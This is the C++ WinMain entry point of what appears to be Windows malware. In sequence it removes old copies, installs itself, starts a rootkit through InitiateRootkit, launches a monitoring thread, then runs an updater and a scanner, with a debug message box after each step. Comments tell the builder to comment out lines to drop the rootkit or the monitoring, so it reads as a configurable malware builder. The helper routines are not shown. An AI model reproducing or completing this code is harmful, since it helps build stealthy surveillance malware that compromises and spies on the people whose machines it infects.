#define _CRT_SECURE_NO_DEPRECATE
#define _CRT_SECURE_NO_WARNINGS

#include "Base.h"
#include "Watcher.h"
#include "Updater.h"
#include "Scanner.h"
#include "MonitoringThread.h"
#include "RootkitInstaller.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shlwapi.lib")

int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	Base *b = Base::instance();
	b->removeOld();
	MessageBoxA(NULL, "b->removeOld", "Current", MB_OK | MB_ICONINFORMATION);

	Watcher *w = Watcher::instance();
	MessageBoxA(NULL, "w->instance", "Current", MB_OK | MB_ICONINFORMATION);
	Settings::instance();
	MessageBoxA(NULL, "s->instance", "Current", MB_OK | MB_ICONINFORMATION);

	w->initInstall();
	MessageBoxA(NULL, "w->initInstall", "Current", MB_OK | MB_ICONINFORMATION);

	// Comment the Next Line if you don't want the Rootkit
	InitiateRootkit();
	MessageBoxA(NULL, "InitiateRootkit", "Current", MB_OK | MB_ICONINFORMATION);

	// Comment the Next Line if you don't want The Monitoring Thread
	InitiateMonitoringThread();
	MessageBoxA(NULL, "InitiateMonitoringThread", "Current", MB_OK | MB_ICONINFORMATION);

	Updater::instance();
	MessageBoxA(NULL, "u->instance", "Current", MB_OK | MB_ICONINFORMATION);

	Scanner::instance()->scan();
	MessageBoxA(NULL, "scanner->scan", "Current", MB_OK | MB_ICONINFORMATION);

	return(0);
}